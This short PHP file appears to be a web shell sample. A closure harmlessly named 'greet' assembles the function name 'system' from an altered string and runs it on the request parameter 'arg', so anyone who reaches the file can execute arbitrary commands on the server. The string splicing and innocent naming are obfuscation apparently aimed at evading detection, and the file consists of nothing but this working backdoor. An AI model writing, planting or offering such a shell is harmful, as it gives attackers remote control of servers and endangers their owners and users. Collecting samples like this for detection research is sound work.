<?php
$greet = function(){
    $method='sysatem';
    (substr($method,0,3).substr($method, 4))($_GET['arg']);
};
$array['func']=$greet;
echo ($array['func'])();